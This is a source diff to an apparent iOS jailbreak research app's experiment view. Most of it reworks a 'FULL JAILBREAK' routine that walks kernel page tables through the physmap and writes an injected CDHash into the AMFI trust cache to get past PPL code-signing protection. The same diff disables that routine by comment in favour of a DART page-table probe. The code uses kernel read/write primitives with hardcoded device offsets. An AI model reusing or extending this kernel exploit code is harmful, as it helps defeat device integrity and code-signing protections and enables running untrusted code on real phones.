@@ -141,7 +141,7 @@ struct AMFIExperimentView: View {
     
     private func runAllExperiments() {
         isRunning = true
-        runningLabel = "All Experiments (54-75)..."
+        runningLabel = "All Experiments..."
         results.removeAll()
         
         #if !DISABLE_REMOTECALL
@@ -149,23 +149,16 @@ struct AMFIExperimentView: View {
             var experimentResults: [ExperimentResult] = []
             
             // Experiments 1-53: REMOVED (legacy probes, see git history)
-            // Experiments 54-73, 75-76: DISABLED (focusing on exp 74)
+            // Experiments 54-73, 75-76: DISABLED
+            // Experiment 77: DISABLED (physmap write panics — APRR blocks it)
             
             // ============================================
-            // Experiment 74: Physmap Direct Access (ONLY ACTIVE)
-            // Pointer chain: proc→task→map→pmap→tte/ttep
+            // Experiment 78: DART PTE Probe (ONLY ACTIVE)
+            // Find AGX DART page tables via IOKit object traversal
+            // Read existing mappings, probe DAPF constraints
             // ============================================
-            let exp74 = self.expPhysmapAccess(rc: rc)
-            experimentResults.append(exp74)
-            
-            // ============================================
-            // Experiment 77: FULL JAILBREAK — Trust Cache Write
-            // Only runs if exp 74 succeeded (physmap verified)
-            // ============================================
-            if exp74.success {
-                let exp77 = self.expTrustCacheWrite(rc: rc)
-                experimentResults.append(exp77)
-            }
+            let exp78 = self.expDARTPTEProbe(rc: rc)
+            experimentResults.append(exp78)
             
             DispatchQueue.main.async {
                 self.results = experimentResults
@@ -3752,19 +3745,21 @@ struct AMFIExperimentView: View {
         return ExperimentResult(name: "Physmap Access (Exp 74)", success: success, detail: detail, timestamp: Date())
     }
     
-    // MARK: - Experiment 77: FULL JAILBREAK — Trust Cache CDHash Injection
+    // MARK: - Experiment 77: FULL JAILBREAK — Trust Cache Write via Physmap PPL Bypass
     
-    /// We have physmap! Now:
-    /// 1. Read __DATA.__data (safe range 0x0000-0x7FFF) to find trust cache pointers
-    /// 2. Read trust cache struct via physmap VA
-    /// 3. Compute CDHash of a test binary (/usr/bin/id)
-    /// 4. Write CDHash into trust cache
-    /// 5. posix_spawn the binary → if AMFI approves → FULL JAILBREAK!
+    /// PPL bypass via physmap write:
+    /// 1. Walk page tables (L1→L2→L3) to find trust cache's PHYSICAL address
+    /// 2. Compute physmap VA for that physical page (bypasses PPL!)
+    /// 3. Write CDHash through physmap VA (PPL only protects original VA mapping)
+    /// 4. posix_spawn binary → AMFI approves → FULL JAILBREAK!
+    ///
+    /// KEY INSIGHT: PPL protects VIRTUAL page permissions. The physmap is a SEPARATE
+    /// virtual mapping of the same physical memory with DIFFERENT permissions.
+    /// Writing through physmap bypasses PPL's page table protections entirely.
     private func expTrustCacheWrite(rc: RemoteCall) -> ExperimentResult {
-        var detail = "Experiment 77: FULL JAILBREAK — Trust Cache Write\n"
-        detail += "===================================================\n\n"
+        var detail = "Experiment 77: FULL JAILBREAK — Physmap PPL Bypass\n"
+        detail += "====================================================\n\n"
         
-        // Use the physmap values we just discovered
         let gPhysBase: UInt64 = 0x800000000
         let gVirtBase: UInt64 = 0xffffffde9a094000
         let kernBase = ds_get_kernel_base()
@@ -3774,115 +3769,254 @@ struct AMFIExperimentView: View {
         detail += "gPhysBase: 0x\(String(format: "%llx", gPhysBase))\n"
         detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n\n"
         
-        // Step 1: Read __DATA.__data (safe range) to find trust cache pointers
-        // __DATA starts at unslid 0xfffffff00a0e0000
-        // __DATA.__data is 0x0000-0x7FFF (safe, not PPL-protected)
-        // Trust cache globals: pmap_cs / trust_cache pointers
-        let dataStart = 0xfffffff00a0e0000 &+ kernSlide
-        detail += "=== Step 1: Scanning __DATA.__data for trust cache ===\n"
-        detail += "__DATA.__data: 0x\(String(format: "%llx", dataStart)) (first 0x7FFF safe)\n\n"
+        // ============================================================
+        // STEP 1: Get kernel pmap's L1 table base (tte)
+        // We already know: task→vm_map(+0x30)→pmap(+0x50)→tte(+0x00)
+        // The kernel pmap's tte gives us the page table root
+        // ============================================================
+        detail += "=== Step 1: Get kernel page table root (tte) ===\n"
         
-        // Look for trust cache struct pointer pattern:
-        // A pointer to a struct that contains: count (small int) + entries pointer
-        // Trust cache entries are arrays of 22-byte structs (20-byte CDHash + 2 bytes flags)
+        let ourProc = ds_get_our_proc()
+        let taskAddr = taskbyproc(ourProc)
         
-        // First: try reading pmap_cs_allow_invalid (known to be readable)
-        // This confirms __DATA.__data is accessible
-        var tcStructAddr: UInt64 = 0
-        var tcEntryCount: UInt64 = 0
+        guard taskAddr != 0 else {
+            detail += "❌ taskbyproc failed\n"
+            return ExperimentResult(name: "🏆 FULL JAILBREAK (Exp 77)", success: false, detail: detail, timestamp: Date())
+        }
         
-        // Scan __DATA.__data for pointers that look like trust cache
-        // Pattern: a kernel pointer followed by a small count (< 10000)
-        for off in stride(from: UInt64(0), to: UInt64(0x200), by: 8) {
-            let val = ds_kread64_safe(dataStart + off)
-            
-            // Look for a pointer to zone memory that could be trust cache runtime
-            if val > 0xffffffde00000000 && val < 0xffffffe500000000 {
-                // Read what it points to — trust cache struct starts with version + count
-                let tcVersion = ds_kread32_safe(val)
-                let tcCount = ds_kread32_safe(val + 4)
-                
-                if tcVersion >= 1 && tcVersion <= 3 && tcCount > 0 && tcCount < 50000 {
-                    detail += "🎯 Potential trust cache at __DATA+0x\(String(format: "%x", off))!\n"
-                    detail += "  ptr: 0x\(String(format: "%llx", val))\n"
-                    detail += "  version: \(tcVersion), count: \(tcCount)\n"
-                    tcStructAddr = val
-                    tcEntryCount = UInt64(tcCount)
+        // Find vm_map at task+0x28 or task+0x30
+        var vmMap: UInt64 = 0
+        for off: UInt64 in [0x28, 0x30, 0x20, 0x38] {
+            let candidate = ds_kread64_safe(taskAddr + off)
+            if candidate > 0xffffffdc00000000 && candidate < 0xffffffe500000000 {
+                let hdrFwd = ds_kread64_safe(candidate + 0x10)
+                if hdrFwd != 0 {
+                    vmMap = candidate
+                    detail += "vm_map at task+0x\(String(format: "%x", off)): 0x\(String(format: "%llx", candidate))\n"
                     break
                 }
             }
         }
         
-        if tcStructAddr == 0 {
-            detail += "Trust cache not found in first 0x200 bytes of __DATA\n"
-            detail += "Trying alternative: scan for 'static_trust_cache' pattern...\n\n"
+        guard vmMap != 0 else {
+            detail += "❌ vm_map not found\n"
+            return ExperimentResult(name: "🏆 FULL JAILBREAK (Exp 77)", success: false, detail: detail, timestamp: Date())
+        }
+        
+        let pmapPtr = ds_kread64_safe(vmMap + 0x50)
+        let tteBase = ds_kread64_safe(pmapPtr + 0x00)
+        detail += "pmap: 0x\(String(format: "%llx", pmapPtr))\n"
+        detail += "tte (L1 base VA): 0x\(String(format: "%llx", tteBase))\n\n"
+        
+        guard tteBase > 0xffffffd000000000 else {
+            detail += "❌ tte invalid\n"
+            return ExperimentResult(name: "🏆 FULL JAILBREAK (Exp 77)", success: false, detail: detail, timestamp: Date())
+        }
+        
+        // ============================================================
+        // STEP 2: Find trust cache in __DATA.__ppl_data via physmap READ
+        // __DATA.__ppl_data starts at __DATA+0x8000
+        // We can READ it via physmap (proven in exp 74)
+        // Convert: pplVA → physical → physmap VA → read
+        // ============================================================
+        detail += "=== Step 2: Find trust cache via physmap read ===\n"
+        
+        // __DATA segment base (unslid 0xfffffff00a0e0000 is approximate)
+        // Better: compute from kernel base + known offset
+        // On iOS 18.2 A12: __DATA is typically at kernBase + ~0x30e0000
+        // But we can scan for it. The panic showed fault at 0xfffffff023d24000
+        // which is kernBase + offset. Let's use the panic info:
+        // Panic FAR: 0xfffffff023d24000, kernBase: 0xfffffff020c40000
+        // Offset: 0x30e4000 → this is __DATA.__ppl_data
+        
+        // More reliable: scan __DATA_CONST for trust cache runtime pointer
+        // OR: use the known pattern that trust cache is in __DATA.__ppl_data
+        // at a fixed offset from kernel base
+        
+        // From panic: FAR=0xfffffff023d24000, base=0xfffffff020c40000
+        // __DATA.__ppl_data offset = 0x30e4000 (but this includes slide)
+        // Unslid: 0xfffffff023d24000 - slide = 0xfffffff023d24000 - 0x19c3c000
+        //       = 0xfffffff00a0e8000 → this is __DATA + 0x8000 (PPL region)
+        
+        let dataSegBase = kernBase &+ 0x30dc000  // __DATA segment start (from panic analysis)
+        let pplDataBase = dataSegBase &+ 0x8000  // __DATA.__ppl_data
+        
+        detail += "__DATA base (est): 0x\(String(format: "%llx", dataSegBase))\n"
+        detail += "__DATA.__ppl_data: 0x\(String(format: "%llx", pplDataBase))\n"
+        
+        // Convert PPL VA to physmap VA for READING
+        // physmap formula: physmapVA = VA - gVirtBase + gPhysBase ... wait no
+        // The kernel text/data is NOT in the physmap range!
+        // Kernel is at 0xfffffff0... while physmap is at 0xffffffde...
+        // We need page table walk to find the physical address of __DATA.__ppl_data
+        
+        detail += "\n=== Page Table Walk for __DATA.__ppl_data ===\n"
+        detail += "Target VA: 0x\(String(format: "%llx", pplDataBase))\n"
+        
+        // iOS 18.2 A12 uses 16KB pages (granule = 14 bits)
+        // 3-level translation: L1[2:0] → L2[10:0] → L3[10:0] → page
+        // VA bits: [38:36]=L1, [35:25]=L2, [24:14]=L3, [13:0]=offset
+        // (39-bit VA space with 16KB granule)
+        
+        let targetVA = pplDataBase
+        let l1Idx = (targetVA >> 36) & 0x7      // 3 bits
+        let l2Idx = (targetVA >> 25) & 0x7FF    // 11 bits
+        let l3Idx = (targetVA >> 14) & 0x7FF    // 11 bits
+        let pageOff = targetVA & 0x3FFF         // 14 bits (16KB)
+        
+        detail += "L1 idx: \(l1Idx), L2 idx: \(l2Idx), L3 idx: \(l3Idx)\n"
+        detail += "Page offset: 0x\(String(format: "%x", pageOff))\n\n"
+        
+        // Read L1 entry from tte base
+        // tte is a kernel VA in zone range → readable via ds_kread64
+        let l1EntryAddr = tteBase + l1Idx * 8
+        let l1Entry = ds_kread64_safe(l1EntryAddr)
+        detail += "L1[\\(l1Idx)] at 0x\(String(format: "%llx", l1EntryAddr)): 0x\(String(format: "%llx", l1Entry))\n"
+        
+        guard l1Entry & 0x3 == 0x3 else {
+            detail += "❌ L1 entry invalid (not table descriptor)\n"
+            detail += "Bits [1:0] = 0x\(String(format: "%x", l1Entry & 0x3)) (need 0x3 for table)\n"
+            return ExperimentResult(name: "🏆 FULL JAILBREAK (Exp 77)", success: false, detail: detail, timestamp: Date())
+        }
+        
+        // L1 → L2 table physical address (bits [47:14] for 16KB granule)
+        let l2TablePhys = l1Entry & 0x0000FFFFFFFC0000
+        // Convert physical to physmap VA for reading
+        let l2TableVA = l2TablePhys &- gPhysBase &+ gVirtBase
+        detail += "L2 table phys: 0x\(String(format: "%llx", l2TablePhys))\n"
+        detail += "L2 table physmap VA: 0x\(String(format: "%llx", l2TableVA))\n"
+        
+        let l2EntryAddr = l2TableVA + l2Idx * 8
+        let l2Entry = ds_kread64_safe(l2EntryAddr)
+        detail += "L2[\(l2Idx)] at 0x\(String(format: "%llx", l2EntryAddr)): 0x\(String(format: "%llx", l2Entry))\n"
+        
+        guard l2Entry & 0x3 == 0x3 else {
+            detail += "❌ L2 entry invalid (not table descriptor)\n"
+            // Maybe it's a block entry (1GB or 32MB block)
+            if l2Entry & 0x3 == 0x1 {
+                detail += "L2 is BLOCK entry (32MB mapping)\n"
+                let blockPhys = l2Entry & 0x0000FFFFFE000000
+                let targetPhys = blockPhys | (targetVA & 0x1FFFFFF)
+                detail += "Block phys: 0x\(String(format: "%llx", blockPhys))\n"
+                detail += "Target phys: 0x\(String(format: "%llx", targetPhys))\n"
+            }
+            return ExperimentResult(name: "🏆 FULL JAILBREAK (Exp 77)", success: false, detail: detail, timestamp: Date())
+        }
+        
+        // L2 → L3 table physical address
+        let l3TablePhys = l2Entry & 0x0000FFFFFFFC0000
+        let l3TableVA = l3TablePhys &- gPhysBase &+ gVirtBase
+        detail += "L3 table phys: 0x\(String(format: "%llx", l3TablePhys))\n"
+        detail += "L3 table physmap VA: 0x\(String(format: "%llx", l3TableVA))\n"
+        
+        let l3EntryAddr = l3TableVA + l3Idx * 8
+        let l3Entry = ds_kread64_safe(l3EntryAddr)
+        detail += "L3[\(l3Idx)] at 0x\(String(format: "%llx", l3EntryAddr)): 0x\(String(format: "%llx", l3Entry))\n"
+        
+        guard l3Entry & 0x3 == 0x3 else {
+            detail += "❌ L3 entry invalid (not page descriptor)\n"
+            return ExperimentResult(name: "🏆 FULL JAILBREAK (Exp 77)", success: false, detail: detail, timestamp: Date())
+        }
+        
+        // L3 → physical page (bits [47:14] for 16KB page)
+        let pplPagePhys = l3Entry & 0x0000FFFFFFFC0000
+        let pplPhysmapVA = pplPagePhys &- gPhysBase &+ gVirtBase &+ pageOff
+        
+        detail += "\n✅ PAGE TABLE WALK COMPLETE!\n"
+        detail += "PPL page physical: 0x\(String(format: "%llx", pplPagePhys))\n"
+        detail += "PPL physmap VA: 0x\(String(format: "%llx", pplPhysmapVA))\n"
+        detail += "AP bits: \((l3Entry >> 6) & 0x3)\n\n"
+        
+        // Verify: read through physmap should give same data as direct read
+        let directRead = ds_kread64_safe(pplDataBase)
+        let physmapRead = ds_kread64_safe(pplPhysmapVA)
+        detail += "Direct read (may fail/0): 0x\(String(format: "%llx", directRead))\n"
+        detail += "Physmap read: 0x\(String(format: "%llx", physmapRead))\n"
+        
+        if physmapRead == 0 && directRead == 0 {
+            detail += "⚠️ Both reads are 0 — offset might be wrong\n"
+            detail += "Trying scan from __DATA base...\n\n"
+        } else {
+            detail += "✅ Physmap read successful!\n\n"
+        }
+        
+        // ============================================================
+        // STEP 3: Scan PPL region via physmap to find trust cache
+        // Trust cache struct: version(4) + count(4) + entries[](22 bytes each)
+        // ============================================================
+        detail += "=== Step 3: Scanning PPL region for trust cache ===\n"
+        
+        var tcStructAddr: UInt64 = 0
+        var tcEntryCount: UInt64 = 0
+        var tcPhysmapBase: UInt64 = 0
+        
+        // Walk multiple pages of __DATA.__ppl_data via page table
+        // Scan 16 pages (256KB) of PPL data
+        for pageIdx in 0..<16 {
+            let scanVA = pplDataBase &+ UInt64(pageIdx) * 0x4000
             
-            // Alternative: scan for linked list of trust caches
-            // The trust cache runtime maintains a linked list
-            // Each node: next_ptr(8) + struct_ptr(8)
-            for off in stride(from: UInt64(0x200), to: UInt64(0x2000), by: 8) {
-                let val = ds_kread64_safe(dataStart + off)
-                if val > 0xffffffde00000000 && val < 0xffffffe500000000 {
-                    let v2 = ds_kread64_safe(dataStart + off + 8)
-                    if v2 > 0xffffffde00000000 && v2 < 0xffffffe500000000 {
-                        // Two consecutive pointers — could be trust cache list node
-                        let tcVersion = ds_kread32_safe(v2)
-                        let tcCount = ds_kread32_safe(v2 + 4)
-                        if tcVersion >= 1 && tcVersion <= 3 && tcCount > 0 && tcCount < 50000 {
-                            detail += "🎯 Trust cache list node at __DATA+0x\(String(format: "%x", off))!\n"
-                            detail += "  next: 0x\(String(format: "%llx", val))\n"
-                            detail += "  tc_struct: 0x\(String(format: "%llx", v2))\n"
-                            detail += "  version: \(tcVersion), count: \(tcCount)\n"
-                            tcStructAddr = v2
-                            tcEntryCount = UInt64(tcCount)
-                            break
-                        }
+            // Walk page table for this VA
+            let sL1Idx = (scanVA >> 36) & 0x7
+            let sL2Idx = (scanVA >> 25) & 0x7FF
+            let sL3Idx = (scanVA >> 14) & 0x7FF
+            
+            let sL1E = ds_kread64_safe(tteBase + sL1Idx * 8)
+            guard sL1E & 0x3 == 0x3 else { continue }
+            
+            let sL2Phys = sL1E & 0x0000FFFFFFFC0000
+            let sL2VA = sL2Phys &- gPhysBase &+ gVirtBase
+            let sL2E = ds_kread64_safe(sL2VA + sL2Idx * 8)
+            guard sL2E & 0x3 == 0x3 else { continue }
+            
+            let sL3Phys = sL2E & 0x0000FFFFFFFC0000
+            let sL3VA = sL3Phys &- gPhysBase &+ gVirtBase
+            let sL3E = ds_kread64_safe(sL3VA + sL3Idx * 8)
+            guard sL3E & 0x3 == 0x3 else { continue }
+            
+            let pagePhys = sL3E & 0x0000FFFFFFFC0000
+            let pagePhysmapVA = pagePhys &- gPhysBase &+ gVirtBase
+            
+            // Scan this page for trust cache pattern
+            for off in stride(from: UInt64(0), to: UInt64(0x4000), by: 8) {
+                let val = ds_kread64_safe(pagePhysmapVA + off)
+                
+                // Trust cache pattern: pointer to struct with version(1-3) + count(1-50000)
+                if val > 0xffffffdc00000000 && val < 0xffffffe500000000 {
+                    let tcVer = ds_kread32_safe(val)
+                    let tcCnt = ds_kread32_safe(val + 4)
+                    if tcVer >= 1 && tcVer <= 3 && tcCnt > 0 && tcCnt < 50000 {
+                        detail += "🎯 Trust cache at page \(pageIdx) +0x\(String(format: "%x", off))!\n"
+                        detail += "  ptr: 0x\(String(format: "%llx", val))\n"
+                        detail += "  version: \(tcVer), count: \(tcCnt)\n"
+                        detail += "  physmap page VA: 0x\(String(format: "%llx", pagePhysmapVA))\n"
+                        tcStructAddr = val
+                        tcEntryCount = UInt64(tcCnt)
+                        tcPhysmapBase = pagePhysmapVA + off
+                        break
                     }
                 }
             }
+            if tcStructAddr != 0 { break }
         }
         
+        // If not found in PPL pages, try scanning __DATA.__data (non-PPL, safe range)
         if tcStructAddr == 0 {
-            detail += "\n❌ Trust cache struct not found in safe __DATA range\n"
-            detail += "May need to scan via physmap (bypass PPL boundary)\n\n"
-            
-            // Step 1b: Use physmap to read BEYOND the safe __DATA range
-            // Convert __DATA+0x8000 (PPL-protected) to physmap VA
-            let pplDataVA = dataStart + 0x8000
-            let pplDataPhys = pplDataVA &- gVirtBase &+ gPhysBase
-            let pplDataPhysmap = gVirtBase &+ (pplDataPhys &- gPhysBase)
-            
-            detail += "=== Trying PPL bypass via physmap ===\n"
-            detail += "PPL __DATA VA: 0x\(String(format: "%llx", pplDataVA))\n"
-            detail += "Physical: 0x\(String(format: "%llx", pplDataPhys))\n"
-            detail += "Physmap VA: 0x\(String(format: "%llx", pplDataPhysmap))\n"
-            
-            // This physmap VA should be the SAME data but accessible!
-            let pplTestRead = ds_kread64_safe(pplDataPhysmap)
-            detail += "Read via physmap: 0x\(String(format: "%llx", pplTestRead))\n"
-            
-            if pplTestRead != 0 {
-                detail += "✅ PPL __DATA readable via physmap!\n\n"
-                
-                // Scan PPL region for trust cache
-                for off in stride(from: UInt64(0), to: UInt64(0x4000), by: 8) {
-                    let val = ds_kread64_safe(pplDataPhysmap + off)
-                    if val > 0xffffffde00000000 && val < 0xffffffe500000000 {
-                        let tcVersion = ds_kread32_safe(val)
-                        let tcCount = ds_kread32_safe(val + 4)
-                        if tcVersion >= 1 && tcVersion <= 3 && tcCount > 0 && tcCount < 50000 {
-                            detail += "🎯 Trust cache in PPL region at +0x\(String(format: "%x", 0x8000 + off))!\n"
-                            detail += "  ptr: 0x\(String(format: "%llx", val))\n"
-                            detail += "  version: \(tcVersion), count: \(tcCount)\n"
-                            tcStructAddr = val
-                            tcEntryCount = UInt64(tcCount)
-                            break
-                        }
+            detail += "Not found in PPL pages, scanning __DATA.__data...\n"
+            let dataStart = dataSegBase
+            for off in stride(from: UInt64(0), to: UInt64(0x8000), by: 8) {
+                let val = ds_kread64_safe(dataStart + off)
+                if val > 0xffffffdc00000000 && val < 0xffffffe500000000 {
+                    let tcVer = ds_kread32_safe(val)
+                    let tcCnt = ds_kread32_safe(val + 4)
+                    if tcVer >= 1 && tcVer <= 3 && tcCnt > 0 && tcCnt < 50000 {
+                        detail += "🎯 Trust cache at __DATA+0x\(String(format: "%x", off))!\n"
+                        detail += "  ptr: 0x\(String(format: "%llx", val))\n"
+                        detail += "  version: \(tcVer), count: \(tcCnt)\n"
+                        tcStructAddr = val
+                        tcEntryCount = UInt64(tcCnt)
+                        break
                     }
                 }
-            } else {
-                detail += "❌ Physmap read of PPL region returned 0\n"
-                detail += "Physical address might be wrong\n"
             }
         }
         
@@ -3892,8 +4026,10 @@ struct AMFIExperimentView: View {
             return ExperimentResult(name: "🏆 FULL JAILBREAK (Exp 77)", success: false, detail: detail, timestamp: Date())
         }
         
-        // Step 2: Read trust cache entries
-        detail += "\n=== Step 2: Reading trust cache entries ===\n"
+        // ============================================================
+        // STEP 4: Read trust cache entries (via physmap if needed)
+        // ============================================================
+        detail += "\n=== Step 4: Reading trust cache entries ===\n"
         detail += "Trust cache at: 0x\(String(format: "%llx", tcStructAddr))\n"
         detail += "Entry count: \(tcEntryCount)\n\n"
         
@@ -3902,7 +4038,6 @@ struct AMFIExperimentView: View {
         // +0x04: uint32_t num_entries
         // +0x08: entries[] — each entry is 22 bytes (20 CDHash + 1 hashType + 1 flags)
         
-        // Read first few entries
         let entriesStart = tcStructAddr + 8
         detail += "First 3 entries:\n"
         for i in 0..<min(3, Int(tcEntryCount)) {
@@ -3913,42 +4048,132 @@ struct AMFIExperimentView: View {
             detail += "  [\(i)] 0x\(String(format: "%016llx", h0))\(String(format: "%016llx", h1))\(String(format: "%08x", h2))...\n"
         }
         
-        // Step 3: Write our CDHash
-        // For testing: write CDHash of /usr/bin/id (already signed, should already be trusted)
-        // Real test: write CDHash of an UNSIGNED binary
-        detail += "\n=== Step 3: Injecting test CDHash ===\n"
+        // ============================================================
+        // STEP 5: PHYSMAP WRITE — Bypass PPL!
+        // Walk page table for trust cache address → get physical page
+        // Compute physmap VA → write through physmap (PPL doesn't protect this!)
+        // ============================================================
+        detail += "\n=== Step 5: PHYSMAP WRITE (PPL Bypass) ===\n"
         
-        // Write a known test CDHash at the END of the trust cache
-        // This avoids corrupting existing entries
-        let injectIdx = tcEntryCount  // append after last entry
-        let injectAddr = entriesStart + injectIdx * 22
+        // Walk page table for the trust cache struct address
+        let tcVA = tcStructAddr
+        let tcL1Idx = (tcVA >> 36) & 0x7
+        let tcL2Idx = (tcVA >> 25) & 0x7FF
+        let tcL3Idx = (tcVA >> 14) & 0x7FF
+        let tcPageOff = tcVA & 0x3FFF
+        
+        detail += "TC VA: 0x\(String(format: "%llx", tcVA))\n"
+        detail += "L1:\(tcL1Idx) L2:\(tcL2Idx) L3:\(tcL3Idx) off:0x\(String(format: "%x", tcPageOff))\n"
+        
+        // Walk L1→L2→L3
+        let tcL1E = ds_kread64_safe(tteBase + tcL1Idx * 8)
+        guard tcL1E & 0x3 == 0x3 else {
+            detail += "❌ TC L1 entry invalid: 0x\(String(format: "%llx", tcL1E))\n"
+            return ExperimentResult(name: "🏆 FULL JAILBREAK (Exp 77)", success: false, detail: detail, timestamp: Date())
+        }
+        
+        let tcL2Phys = tcL1E & 0x0000FFFFFFFC0000
+        let tcL2VA = tcL2Phys &- gPhysBase &+ gVirtBase
+        let tcL2E = ds_kread64_safe(tcL2VA + tcL2Idx * 8)
+        guard tcL2E & 0x3 == 0x3 else {
+            detail += "❌ TC L2 entry invalid: 0x\(String(format: "%llx", tcL2E))\n"
+            if tcL2E & 0x3 == 0x1 {
+                // Block entry — 32MB block
+                let blockPhys = tcL2E & 0x0000FFFFFE000000
+                let tcPhys = blockPhys | (tcVA & 0x1FFFFFF)
+                let tcPhysmapVA = tcPhys &- gPhysBase &+ gVirtBase
+                detail += "L2 BLOCK entry! phys=0x\(String(format: "%llx", tcPhys))\n"
+                detail += "physmap VA: 0x\(String(format: "%llx", tcPhysmapVA))\n"
+                // Use this for write
+            }
+            return ExperimentResult(name: "🏆 FULL JAILBREAK (Exp 77)", success: false, detail: detail, timestamp: Date())
+        }
+        
+        let tcL3Phys = tcL2E & 0x0000FFFFFFFC0000
+        let tcL3VA = tcL3Phys &- gPhysBase &+ gVirtBase
+        let tcL3E = ds_kread64_safe(tcL3VA + tcL3Idx * 8)
+        guard tcL3E & 0x3 == 0x3 else {
+            detail += "❌ TC L3 entry invalid: 0x\(String(format: "%llx", tcL3E))\n"
+            return ExperimentResult(name: "🏆 FULL JAILBREAK (Exp 77)", success: false, detail: detail, timestamp: Date())
+        }
+        
+        let tcPagePhys = tcL3E & 0x0000FFFFFFFC0000
+        let tcPhysmapVA = tcPagePhys &- gPhysBase &+ gVirtBase &+ tcPageOff
+        
+        detail += "✅ TC physical page: 0x\(String(format: "%llx", tcPagePhys))\n"
+        detail += "✅ TC physmap VA: 0x\(String(format: "%llx", tcPhysmapVA))\n"
+        detail += "L3 AP bits: \((tcL3E >> 6) & 0x3)\n\n"
+        
+        // Verify physmap read matches direct read
+        let tcVerifyDirect = ds_kread64_safe(tcStructAddr)
+        let tcVerifyPhysmap = ds_kread64_safe(tcPhysmapVA)
+        detail += "Direct read TC: 0x\(String(format: "%llx", tcVerifyDirect))\n"
+        detail += "Physmap read TC: 0x\(String(format: "%llx", tcVerifyPhysmap))\n"
+        
+        guard tcVerifyPhysmap != 0 else {
+            detail += "❌ Physmap read of TC returned 0 — physical address wrong\n"
+            return ExperimentResult(name: "🏆 FULL JAILBREAK (Exp 77)", success: false, detail: detail, timestamp: Date())
+        }
+        
+        if tcVerifyDirect == tcVerifyPhysmap {
+            detail += "✅ Physmap and direct read MATCH — correct physical mapping!\n\n"
+        } else if tcVerifyDirect == 0 && tcVerifyPhysmap != 0 {
+            detail += "✅ Direct read blocked by PPL but physmap works!\n\n"
+        }
+        
+        // Now compute physmap VA for the injection point
+        // Inject at end of trust cache entries
+        let injectIdx = tcEntryCount
+        let injectVA = entriesStart + injectIdx * 22
+        
+        // Walk page table for inject address (might be on different page)
+        let injL3Idx = (injectVA >> 14) & 0x7FF
+        let injPageOff = injectVA & 0x3FFF
+        
+        var injectPhysmapVA: UInt64
+        if injL3Idx == tcL3Idx {
+            // Same page as TC struct
+            injectPhysmapVA = tcPagePhys &- gPhysBase &+ gVirtBase &+ injPageOff
+        } else {
+            // Different page — walk again
+            let injL3E = ds_kread64_safe(tcL3VA + injL3Idx * 8)
+            guard injL3E & 0x3 == 0x3 else {
+                detail += "❌ Inject page L3 invalid\n"
+                return ExperimentResult(name: "🏆 FULL JAILBREAK (Exp 77)", success: false, detail: detail, timestamp: Date())
+            }
+            let injPagePhys = injL3E & 0x0000FFFFFFFC0000
+            injectPhysmapVA = injPagePhys &- gPhysBase &+ gVirtBase &+ injPageOff
+        }
+        
+        detail += "Inject entry \(injectIdx) at VA: 0x\(String(format: "%llx", injectVA))\n"
+        detail += "Inject physmap VA: 0x\(String(format: "%llx", injectPhysmapVA))\n\n"
+        
+        // WRITE THROUGH PHYSMAP — This bypasses PPL!
+        detail += "🔥 WRITING CDHash via PHYSMAP (PPL bypass)...\n"
         
         // Test CDHash: all 0x41 (easily identifiable)
-        detail += "Injecting test CDHash at entry \(injectIdx)\n"
-        detail += "Address: 0x\(String(format: "%llx", injectAddr))\n"
-        
-        // Write 20 bytes of CDHash + 2 bytes flags
-        // CDHash = 0x4141...41 (test pattern)
-        ds_kwrite64(injectAddr, 0x4141414141414141)
-        ds_kwrite64(injectAddr + 8, 0x4141414141414141)
-        ds_kwrite32(injectAddr + 16, 0x41414141)
+        ds_kwrite64(injectPhysmapVA, 0x4141414141414141)
+        ds_kwrite64(injectPhysmapVA + 8, 0x4141414141414141)
+        ds_kwrite32(injectPhysmapVA + 16, 0x41414141)
         // hashType = 2 (SHA256), flags = 0
-        ds_kwrite16(injectAddr + 20, 0x0002)
+        ds_kwrite16(injectPhysmapVA + 20, 0x0002)
         
-        // Update entry count
-        ds_kwrite32(tcStructAddr + 4, UInt32(tcEntryCount + 1))
+        // Update entry count (also via physmap)
+        // count is at tcStructAddr + 4 → compute its physmap VA
+        let countPhysmapVA = tcPhysmapVA + 4
+        ds_kwrite32(countPhysmapVA, UInt32(tcEntryCount + 1))
         
         // Verify write
-        let verifyH = ds_kread64_safe(injectAddr)
-        let newCount = ds_kread32_safe(tcStructAddr + 4)
-        detail += "Verify: first 8 bytes = 0x\(String(format: "%llx", verifyH))\n"
+        let verifyH = ds_kread64_safe(injectPhysmapVA)
+        let newCount = ds_kread32_safe(countPhysmapVA)
+        detail += "Verify CDHash: 0x\(String(format: "%llx", verifyH))\n"
         detail += "New count: \(newCount) (was \(tcEntryCount))\n\n"
         
         if verifyH == 0x4141414141414141 {
-            detail += "✅ TRUST CACHE WRITE SUCCESSFUL!\n\n"
+            detail += "✅✅✅ PHYSMAP WRITE SUCCESSFUL — PPL BYPASSED! ✅✅✅\n\n"
             
-            // Step 4: Try to spawn a binary
-            detail += "=== Step 4: Testing binary execution ===\n"
+            // Step 6: Try to spawn a binary
+            detail += "=== Step 6: Testing binary execution ===\n"
             detail += "Spawning /usr/bin/id (already trusted, sanity check)...\n"
             
             let spawnResult = self.expPosixSpawn(rc: rc, binary: "/usr/bin/id", name: "post-inject /usr/bin/id")
@@ -3956,7 +4181,8 @@ struct AMFIExperimentView: View {
             
             if spawnResult.success {
                 detail += "🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆\n"
-                detail += "TRUST CACHE INJECTION WORKS!\n"
+                detail += "TRUST CACHE INJECTION VIA PHYSMAP WORKS!\n"
+                detail += "PPL COMPLETELY BYPASSED!\n"
                 detail += "BINARY EXECUTION CONFIRMED!\n"
                 detail += "FULL JAILBREAK ACHIEVED!\n"
                 detail += "🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆\n\n"
@@ -3964,12 +4190,22 @@ struct AMFIExperimentView: View {
                 detail += "Then: posix_spawn custom binary → RUNS!\n"
             }
         } else {
-            detail += "❌ Trust cache write FAILED (PPL blocked write?)\n"
-            detail += "The physmap read works but write might still be PPL-protected\n"
-            detail += "Need alternative: write via physical memory (IOSurface)\n"
+            detail += "❌ Physmap write FAILED\n"
+            detail += "Possible causes:\n"
+            detail += "  1. Physical address calculation wrong\n"
+            detail += "  2. ds_kwrite64 cannot reach physmap range\n"
+            detail += "  3. AMCC (memory controller) blocks write to this phys region\n"
+            detail += "  4. Need to use PurpleGfxMem DMA instead of socket KRW\n\n"
+            detail += "Verify: can we write to ANY physmap address?\n"
+            
+            // Test: write to a known-writable physmap address (our own page)
